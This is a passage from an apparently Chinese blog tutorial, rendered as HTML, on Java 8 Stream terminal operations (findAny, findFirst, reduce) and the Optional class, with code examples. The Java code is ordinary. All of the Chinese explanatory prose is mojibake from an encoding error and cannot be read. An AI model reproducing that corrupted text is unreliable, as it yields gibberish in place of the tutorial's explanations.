ã€‚è¯¥æ–¹æ³•æ²¡æœ‰åŠæ³•ä¿è¯è·å–çš„ä¸€å®šæ˜¯æµä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p>ä¾‹å­ï¼š</p><p>â€‹è·å–ä»»æ„ä¸€ä¸ªå¹´é¾„å¤§äº13çš„ä½œå®¶ï¼Œå¦‚æœå­˜åœ¨å°±è¾“å‡ºä»–çš„åå­—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        è·å–ä»»æ„ä¸€ä¸ªå¹´é¾„å¤§äº13çš„ä½œå®¶ï¼Œå¦‚æœå­˜åœ¨å°±è¾“å‡ºä»–çš„åå­—</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        Optional&lt;Author&gt; optionalAuthor = authors.stream()<br>                .filter(author -&gt; author.getAge()&gt;<span class="hljs-number">13</span>)<br>                .findAny();<br><br>        optionalAuthor.ifPresent(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><h6 id="findfirst"><a class="markdownIt-Anchor" href="#findfirst"></a> findFirst</h6><p>â€‹è·å–æµä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p>ä¾‹å­ï¼š</p><p>â€‹è·å–ä¸€ä¸ªå¹´é¾„æœ€å°çš„ä½œå®¶ï¼Œå¹¶è¾“å‡ºä»–çš„å§“åã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        è·å–ä¸€ä¸ªå¹´é¾„æœ€å°çš„ä½œå®¶ï¼Œå¹¶è¾“å‡ºä»–çš„å§“åã€‚</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        Optional&lt;Author&gt; first = authors.stream()<br>                .sorted((o1, o2) -&gt; o1.getAge() - o2.getAge())<br>                .findFirst();<br><br>        first.ifPresent(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><p>DeBugä»£ç å‘ç°ï¼Œsteamæµä¼šå—åˆ°åé¢æ“ä½œçš„å½±å“ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Test_6</span><span class="hljs-params">()</span> &#123;<br>    authors.<br>            stream()<br>            .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">14</span>)<br>            .forEach(author -&gt; System.out.println(author));<br>    authors.<br>            stream()<br>            .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">14</span>)<br>            .findAny()<br>            .ifPresent(author -&gt; System.out.println(author.getName()));<br><br>    authors.<br>            stream()<br>            .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">14</span>)<br>            .findFirst()<br>            .ifPresent(author -&gt; System.out.println(author.getName()));<br><br>    authors.<br>            stream()<br>            .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">15</span>)<br>            .findAny()<br>            .ifPresent(author -&gt; System.out.println(author.getName()));<br><br>    authors.<br>            stream()<br>            .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">15</span>)<br>            .findFirst()<br>            .ifPresent(author -&gt; System.out.println(author.getName()));<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221221154049113.png" alt="image-20221221154049113" /></p><p>æˆ‘çš„çŒœæƒ³ï¼š</p><ol><li><p>å› ä¸ºè¯¥æµæ˜¯æœ‰é¡ºåºçš„ä¸²è¡Œæµï¼ŒæŒ‰ç…§æœ€ä¼˜æ‰§è¡Œä¼šæŒ‰ç…§é¡ºåºã€‚</p></li><li><p><code>findFirst()</code>éœ€è¦è·å–æµçš„ç¬¬ä¸€ä¸ªã€‚ä¸€ä¸ªå…ƒç´ é€šè¿‡<strong>filter</strong>ï¼Œåˆ™æœ‰ä¸ªå…ƒç´ è¿›å…¥åˆ°<strong>findFirst</strong>ã€‚åœ¨<strong>findFirst</strong>ä¹‹å‰çš„å¯¹æµçš„æ“ä½œç›´æ¥åœæ­¢ã€‚</p></li><li><p><code>findAnyï¼ˆï¼‰</code> è·å–æµä¸­çš„ä»»æ„ä¸€ä¸ªå…ƒç´ ã€‚åœ¨ä¸²è¡Œæµä¸­ï¼Œä¸ºäº†ä¿è¯æ€§èƒ½ä¹ŸåŸºæœ¬æ˜¯ç¬¬ä¸€ä¸ªã€‚å°±å’Œ<code>findFirst()</code>ä¸€æ ·ã€‚</p></li><li><p>å®ƒä»¬éƒ½æ˜¯ç»ˆç»“æ“ä½œï¼Œæµè¢«ç»ˆç»“äº†ã€‚</p></li></ol><h5 id="reduceå½’å¹¶"><a class="markdownIt-Anchor" href="#reduceå½’å¹¶"></a> reduceå½’å¹¶</h5><p>â€‹å¯¹æµä¸­çš„æ•°æ®æŒ‰ç…§ä½ æŒ‡å®šçš„è®¡ç®—æ–¹å¼è®¡ç®—å‡ºä¸€ä¸ªç»“æœã€‚ï¼ˆç¼©å‡æ“ä½œï¼‰</p><p>â€‹reduceçš„ä½œç”¨æ˜¯æŠŠstreamä¸­çš„å…ƒç´ ç»™ç»„åˆèµ·æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€ä¸ªåˆå§‹å€¼ï¼Œå®ƒä¼šæŒ‰ç…§æˆ‘ä»¬çš„è®¡ç®—æ–¹å¼ä¾æ¬¡æ‹¿æµä¸­çš„å…ƒç´ å’Œåˆå§‹åŒ–å€¼è¿›è¡Œè®¡ç®—ï¼Œè®¡ç®—ç»“æœå†å’Œåé¢çš„å…ƒç´ è®¡ç®—ã€‚</p><p>â€‹reduceä¸¤ä¸ªå‚æ•°çš„é‡è½½å½¢å¼å†…éƒ¨çš„è®¡ç®—æ–¹å¼å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> identity;<br><span class="hljs-keyword">for</span> (T element : <span class="hljs-built_in">this</span> stream)<br>result = accumulator.apply(result, element)<br><span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure><p>â€‹å…¶ä¸­identityå°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ–¹æ³•å‚æ•°ä¼ å…¥çš„åˆå§‹å€¼ï¼Œaccumulatorçš„applyå…·ä½“è¿›è¡Œä»€ä¹ˆè®¡ç®—ä¹Ÿæ˜¯æˆ‘ä»¬é€šè¿‡æ–¹æ³•å‚æ•°æ¥ç¡®å®šçš„ã€‚</p><p>ä¾‹å­ï¼š</p><p>â€‹ä½¿ç”¨reduceæ±‚æ‰€æœ‰ä½œè€…å¹´é¾„çš„å’Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        ä½¿ç”¨reduceæ±‚æ‰€æœ‰ä½œè€…å¹´é¾„çš„å’Œ</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> authors.stream()<br>                .distinct()<br>                .map(author -&gt; author.getAge())<br>                .reduce(<span class="hljs-number">0</span>, (result, element) -&gt; result + element);<br>        System.out.println(sum);<br></code></pre></td></tr></table></figure><p>â€‹ä½¿ç”¨reduceæ±‚æ‰€æœ‰ä½œè€…ä¸­å¹´é¾„çš„æœ€å¤§å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        ä½¿ç”¨reduceæ±‚æ‰€æœ‰ä½œè€…ä¸­å¹´é¾„çš„æœ€å¤§å€¼</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> authors.stream()<br>                .map(author -&gt; author.getAge())<br>                .reduce(Integer.MIN_VALUE, (result, element) -&gt; result &lt; element ? element : result);<br><br>        System.out.println(max);<br></code></pre></td></tr></table></figure><p>â€‹ä½¿ç”¨reduceæ±‚æ‰€æœ‰ä½œè€…ä¸­å¹´é¾„çš„æœ€å°å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        ä½¿ç”¨reduceæ±‚æ‰€æœ‰ä½œè€…ä¸­å¹´é¾„çš„æœ€å°å€¼</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">min</span> <span class="hljs-operator">=</span> authors.stream()<br>                .map(author -&gt; author.getAge())<br>                .reduce(Integer.MAX_VALUE, (result, element) -&gt; result &gt; element ? element : result);<br>        System.out.println(min);<br></code></pre></td></tr></table></figure><p>â€‹reduceä¸€ä¸ªå‚æ•°çš„é‡è½½å½¢å¼å†…éƒ¨çš„è®¡ç®—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-variable">foundAny</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-type">T</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>  <span class="hljs-keyword">for</span> (T element : <span class="hljs-built_in">this</span> stream) &#123;<br>      <span class="hljs-keyword">if</span> (!foundAny) &#123;<br>          foundAny = <span class="hljs-literal">true</span>;<br>          result = element;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>          result = accumulator.apply(result, element);<br>  &#125;<br>  <span class="hljs-keyword">return</span> foundAny ? Optional.of(result) : Optional.empty();<br></code></pre></td></tr></table></figure><p>â€‹å¦‚æœç”¨ä¸€ä¸ªå‚æ•°çš„é‡è½½æ–¹æ³•å»æ±‚æœ€å°å€¼ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        ä½¿ç”¨reduceæ±‚æ‰€æœ‰ä½œè€…ä¸­å¹´é¾„çš„æœ€å°å€¼</span><br>List&lt;Author&gt; authors = getAuthors();<br>Optional&lt;Integer&gt; minOptional = authors.stream()<br>        .map(author -&gt; author.getAge())<br>        .reduce((result, element) -&gt; result &gt; element ? element : result);<br>minOptional.ifPresent(age-&gt; System.out.println(age));<br></code></pre></td></tr></table></figure><h3 id="35-æ³¨æ„äº‹é¡¹"><a class="markdownIt-Anchor" href="#35-æ³¨æ„äº‹é¡¹"></a> 3.5 æ³¨æ„äº‹é¡¹</h3><ul><li>æƒ°æ€§æ±‚å€¼ï¼ˆå¦‚æœæ²¡æœ‰ç»ˆç»“æ“ä½œï¼Œæ²¡æœ‰ä¸­é—´æ“ä½œæ˜¯ä¸ä¼šå¾—åˆ°æ‰§è¡Œçš„ï¼‰</li><li>æµæ˜¯ä¸€æ¬¡æ€§çš„ï¼ˆä¸€æ—¦ä¸€ä¸ªæµå¯¹è±¡ç»è¿‡ä¸€ä¸ªç»ˆç»“æ“ä½œåã€‚è¿™ä¸ªæµå°±ä¸èƒ½å†è¢«ä½¿ç”¨ï¼‰</li><li>ä¸ä¼šå½±å“åŸæ•°æ®ï¼ˆæˆ‘ä»¬åœ¨æµä¸­å¯ä»¥å¤šæ•°æ®åšå¾ˆå¤šå¤„ç†ã€‚ä½†æ˜¯æ­£å¸¸æƒ…å†µä¸‹æ˜¯ä¸ä¼šå½±å“åŸæ¥é›†åˆä¸­çš„å…ƒç´ çš„ã€‚è¿™å¾€å¾€ä¹Ÿæ˜¯æˆ‘ä»¬æœŸæœ›çš„ï¼‰</li></ul><h2 id="4-optional"><a class="markdownIt-Anchor" href="#4-optional"></a> 4. Optional</h2><h3 id="41-æ¦‚è¿°"><a class="markdownIt-Anchor" href="#41-æ¦‚è¿°"></a> 4.1 æ¦‚è¿°</h3><p>â€‹æˆ‘ä»¬åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™å‡ºç°æœ€å¤šçš„å°±æ˜¯ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚æ‰€ä»¥åœ¨å¾ˆå¤šæƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦åšå„ç§éç©ºçš„åˆ¤æ–­ã€‚</p><p>â€‹ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Author</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> getAuthor();<br><span class="hljs-keyword">if</span>(author!=<span class="hljs-literal">null</span>)&#123;<br>    System.out.println(author.getName());<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹å°¤å…¶æ˜¯å¯¹è±¡ä¸­çš„å±æ€§è¿˜æ˜¯ä¸€ä¸ªå¯¹è±¡çš„æƒ…å†µä¸‹ã€‚è¿™ç§åˆ¤æ–­ä¼šæ›´å¤šã€‚</p><p>â€‹è€Œè¿‡å¤šçš„åˆ¤æ–­è¯­å¥ä¼šè®©æˆ‘ä»¬çš„ä»£ç æ˜¾å¾—è‡ƒè‚¿ä¸å ªã€‚</p><p>â€‹æ‰€ä»¥åœ¨JDK8ä¸­å¼•å…¥äº†Optional,å…»æˆä½¿ç”¨Optionalçš„ä¹ æƒ¯åä½ å¯ä»¥å†™å‡ºæ›´ä¼˜é›…çš„ä»£ç æ¥é¿å…ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</p><p>â€‹å¹¶ä¸”åœ¨å¾ˆå¤šå‡½æ•°å¼ç¼–ç¨‹ç›¸å…³çš„APIä¸­ä¹Ÿéƒ½ç”¨åˆ°äº†Optionalï¼Œå¦‚æœä¸ä¼šä½¿ç”¨Optionalä¹Ÿä¼šå¯¹å‡½æ•°å¼ç¼–ç¨‹çš„å­¦ä¹ é€ æˆå½±å“ã€‚</p><h3 id="42-ä½¿ç”¨"><a class="markdownIt-Anchor" href="#42-ä½¿ç”¨"></a> 4.2 ä½¿ç”¨</h3><h4 id="421-åˆ›å»ºå¯¹è±¡"><a class="markdownIt-Anchor" href="#421-åˆ›å»ºå¯¹è±¡"></a> 4.2.1 åˆ›å»ºå¯¹è±¡</h4><p>â€‹Optionalå°±å¥½åƒæ˜¯åŒ…è£…ç±»ï¼Œå¯ä»¥æŠŠæˆ‘ä»¬çš„å…·ä½“æ•°æ®å°è£…Optionalå¯¹è±¡å†…éƒ¨ã€‚ç„¶åæˆ‘ä»¬å»ä½¿ç”¨Optionalä¸­å°è£…å¥½çš„æ–¹æ³•æ“ä½œå°è£…è¿›å»çš„æ•°æ®å°±å¯ä»¥éå¸¸ä¼˜é›…çš„é¿å…ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</p><p>â€‹æˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨<strong>Optional</strong>çš„<strong>é™æ€æ–¹æ³•ofNullable</strong>æ¥æŠŠæ•°æ®å°è£…æˆä¸€ä¸ªOptionalå¯¹è±¡ã€‚æ— è®ºä¼ å…¥çš„å‚æ•°æ˜¯å¦ä¸ºnulléƒ½ä¸ä¼šå‡ºç°é—®é¢˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Author</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> getAuthor();<br>Optional&lt;Author&gt; authorOptional = Optional.ofNullable(author);<br></code></pre></td></tr></table></figure><p>â€‹ä½ å¯èƒ½ä¼šè§‰å¾—è¿˜è¦åŠ ä¸€è¡Œä»£ç æ¥å°è£…æ•°æ®æ¯”è¾ƒéº»çƒ¦ã€‚ä½†æ˜¯å¦‚æœæ”¹é€ ä¸‹getAuthoræ–¹æ³•ï¼Œè®©å…¶çš„è¿”å›å€¼å°±æ˜¯å°è£…å¥½çš„Optionalçš„è¯ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨æ—¶å°±ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚</p><p>â€‹è€Œä¸”åœ¨å®é™…å¼€å‘ä¸­æˆ‘ä»¬çš„æ•°æ®å¾ˆå¤šæ˜¯ä»æ•°æ®åº“è·å–çš„ã€‚Mybatisä»3.5ç‰ˆæœ¬å¯ä»¥ä¹Ÿå·²ç»æ”¯æŒOptionaläº†ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠdaoæ–¹æ³•çš„è¿”å›å€¼ç±»å‹å®šä¹‰æˆOptionalç±»å‹ï¼ŒMyBastisä¼šè‡ªå·±æŠŠæ•°æ®å°è£…æˆOptionalå¯¹è±¡è¿”å›ã€‚å°è£…çš„è¿‡ç¨‹ä¹Ÿä¸éœ€è¦æˆ‘ä»¬è‡ªå·±æ“ä½œã€‚</p><p>â€‹å¦‚æœä½ <strong>ç¡®å®šä¸€ä¸ªå¯¹è±¡ä¸æ˜¯ç©º</strong>çš„åˆ™å¯ä»¥ä½¿ç”¨<strong>Optional</strong>çš„<strong>é™æ€æ–¹æ³•of</strong>æ¥æŠŠæ•°æ®å°è£…æˆOptionalå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Author</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>();<br>Optional&lt;Author&gt; authorOptional = Optional.of(author);<br></code></pre></td></tr></table></figure><p>â€‹ä½†æ˜¯ä¸€å®šè¦æ³¨æ„ï¼Œå¦‚æœä½¿ç”¨ofçš„æ—¶å€™ä¼ å…¥çš„å‚æ•°å¿…é¡»ä¸ä¸ºnullã€‚ï¼ˆå°è¯•ä¸‹ä¼ å…¥nullä¼šå‡ºç°ä»€ä¹ˆç»“æœï¼‰</p><p><code>NullPointerException</code></p><p>â€‹å¦‚æœä¸€ä¸ªæ–¹æ³•çš„è¿”å›å€¼ç±»å‹æ˜¯Optionalç±»å‹ã€‚è€Œå¦‚æœæˆ‘ä»¬ç»åˆ¤æ–­å‘ç°æŸæ¬¡è®¡ç®—å¾—åˆ°çš„è¿”å›å€¼ä¸ºnullï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦æŠŠnullå°è£…æˆOptionalå¯¹è±¡è¿”å›ã€‚è¿™æ—¶åˆ™å¯ä»¥ä½¿ç”¨<strong>Optional</strong>çš„<strong>é™æ€æ–¹æ³•empty</strong>æ¥è¿›è¡Œå°è£…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional.empty()<br></code></pre></td></tr></table></figure><p>â€‹</p><p>â€‹æ‰€ä»¥æœ€åä½ è§‰å¾—å“ªç§æ–¹å¼ä¼šæ›´æ–¹ä¾¿å‘¢ï¼Ÿ<strong>ofNullable</strong></p><h4 id="422-å®‰å…¨æ¶ˆè´¹å€¼"><a class="markdownIt-Anchor" href="#422-å®‰å…¨æ¶ˆè´¹å€¼"></a> 4.2.2 å®‰å…¨æ¶ˆè´¹å€¼</h4><p>â€‹æˆ‘ä»¬è·å–åˆ°ä¸€ä¸ªOptionalå¯¹è±¡åè‚¯å®šéœ€è¦å¯¹å…¶ä¸­çš„æ•°æ®è¿›è¡Œä½¿ç”¨ã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶<strong>ifPresent</strong>æ–¹æ³•å¯¹æ¥æ¶ˆè´¹å…¶ä¸­çš„å€¼ã€‚</p><p>â€‹è¿™ä¸ªæ–¹æ³•ä¼šåˆ¤æ–­å…¶å†…å°è£…çš„æ•°æ®æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºæ—¶æ‰ä¼šæ‰§è¡Œå…·ä½“çš„æ¶ˆè´¹ä»£ç ã€‚è¿™æ ·ä½¿ç”¨èµ·æ¥å°±æ›´åŠ å®‰å…¨äº†ã€‚</p><p>â€‹ä¾‹å¦‚,ä»¥ä¸‹å†™æ³•å°±ä¼˜é›…çš„é¿å…äº†ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = Optional.ofNullable(getAuthor());<br><br>authorOptional.ifPresent(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><h4 id="423-è·å–å€¼"><a class="markdownIt-Anchor" href="#423-è·å–å€¼"></a> 4.2.3 è·å–å€¼</h4><p>â€‹å¦‚æœæˆ‘ä»¬æƒ³è·å–å€¼è‡ªå·±è¿›è¡Œå¤„ç†å¯ä»¥ä½¿ç”¨getæ–¹æ³•è·å–ï¼Œä½†æ˜¯ä¸æ¨èã€‚å› ä¸ºå½“Optionalå†…éƒ¨çš„æ•°æ®ä¸ºç©ºçš„æ—¶å€™ä¼šå‡ºç°å¼‚å¸¸ã€‚</p><h4 id="424-å®‰å…¨è·å–å€¼"><a class="markdownIt-Anchor" href="#424-å®‰å…¨è·å–å€¼"></a> 4.2.4 å®‰å…¨è·å–å€¼</h4><p>â€‹å¦‚æœæˆ‘ä»¬æœŸæœ›å®‰å…¨çš„è·å–å€¼ã€‚æˆ‘ä»¬ä¸æ¨èä½¿ç”¨getæ–¹æ³•ï¼Œè€Œæ˜¯ä½¿ç”¨Optionalæä¾›çš„ä»¥ä¸‹æ–¹æ³•ã€‚</p><ul><li><p>orElseGet</p><p>è·å–æ•°æ®å¹¶ä¸”è®¾ç½®æ•°æ®ä¸ºç©ºæ—¶çš„é»˜è®¤å€¼ã€‚å¦‚æœæ•°æ®ä¸ä¸ºç©ºå°±èƒ½è·å–åˆ°è¯¥æ•°æ®ã€‚å¦‚æœä¸ºç©ºåˆ™æ ¹æ®ä½ ä¼ å…¥çš„å‚æ•°æ¥åˆ›å»ºå¯¹è±¡ä½œä¸ºé»˜è®¤å€¼è¿”å›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = Optional.ofNullable(getAuthor());<br><span class="hljs-type">Author</span> <span class="hljs-variable">author1</span> <span class="hljs-operator">=</span> authorOptional.orElseGet(() -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>());<br></code></pre></td></tr></table></figure></li><li><p>orElseThrow</p><p>è·å–æ•°æ®ï¼Œå¦‚æœæ•°æ®ä¸ä¸ºç©ºå°±èƒ½è·å–åˆ°è¯¥æ•°æ®ã€‚å¦‚æœä¸ºç©ºåˆ™æ ¹æ®ä½ ä¼ å…¥çš„å‚æ•°æ¥åˆ›å»ºå¼‚å¸¸æŠ›å‡ºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = Optional.ofNullable(getAuthor());<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">Author</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> authorOptional.orElseThrow((Supplier&lt;Throwable&gt;) () -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;authorä¸ºç©º&quot;</span>));<br>    System.out.println(author.getName());<br>&#125; <span class="hljs-keyword">catch</span> (Throwable throwable) &#123;<br>    throwable.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="425-è¿‡æ»¤"><a class="markdownIt-Anchor" href="#425-è¿‡æ»¤"></a> 4.2.5 è¿‡æ»¤</h4><p>â€‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨filteræ–¹æ³•å¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤ã€‚å¦‚æœåŸæœ¬æ˜¯æœ‰æ•°æ®çš„ï¼Œä½†æ˜¯ä¸ç¬¦åˆåˆ¤æ–­ï¼Œä¹Ÿä¼šå˜æˆä¸€ä¸ªæ— æ•°æ®çš„Optionalå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = Optional.ofNullable(getAuthor());<br>authorOptional.filter(author -&gt; author.getAge()&gt;<span class="hljs-number">100</span>).ifPresent(author -&gt; System.out.println(author.getName()));<br><br></code></pre></td></tr></table></figure><h4 id="426-åˆ¤æ–­"><a class="markdownIt-Anchor" href="#426-åˆ¤æ–­"></a> 4.2.6 åˆ¤æ–­</h4><p>â€‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨isPresentæ–¹æ³•è¿›è¡Œæ˜¯å¦å­˜åœ¨æ•°æ®çš„åˆ¤æ–­ã€‚å¦‚æœä¸ºç©ºè¿”å›å€¼ä¸ºfalse,å¦‚æœä¸ä¸ºç©ºï¼Œè¿”å›å€¼ä¸ºtrueã€‚ä½†æ˜¯è¿™ç§æ–¹å¼å¹¶ä¸èƒ½ä½“ç°Optionalçš„å¥½å¤„ï¼Œ<strong>æ›´æ¨èä½¿ç”¨ifPresentæ–¹æ³•</strong>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Optional&lt;Author&gt; authorOptional = Optional.ofNullable(getAuthor());<br><br><span class="hljs-keyword">if</span> (authorOptional.isPresent()) &#123;<br>    System.out.println(authorOptional.get().getName());<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="427-æ•°æ®è½¬æ¢"><a class="markdownIt-Anchor" href="#427-æ•°æ®è½¬æ¢"></a> 4.2.7 æ•°æ®è½¬æ¢</h4><p>â€‹Optionalè¿˜æä¾›äº†mapå¯ä»¥è®©æˆ‘ä»¬çš„å¯¹æ•°æ®è¿›è¡Œè½¬æ¢ï¼Œå¹¶ä¸”è½¬æ¢å¾—åˆ°çš„æ•°æ®ä¹Ÿè¿˜æ˜¯è¢«OptionalåŒ…è£…å¥½çš„ï¼Œä¿è¯äº†æˆ‘ä»¬çš„ä½¿ç”¨å®‰å…¨ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬æƒ³è·å–ä½œå®¶çš„ä¹¦ç±é›†åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testMap</span><span class="hljs-params">()</span> &#123;<br>    Optional&lt;Author&gt; authorOptional = getAuthorOptional();<br>    Optional&lt;List&lt;Book&gt;&gt; optionalBooks = authorOptional.map(author -&gt; author.getBooks());<br>    optionalBooks.ifPresent(books -&gt; System.out.println(books));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-å‡½æ•°å¼æ¥å£"><a class="markdownIt-Anchor" href="#5-å‡½æ•°å¼æ¥å£"></a> 5. å‡½æ•°å¼æ¥å£</h2><h3 id="51-æ¦‚è¿°"><a class="markdownIt-Anchor" 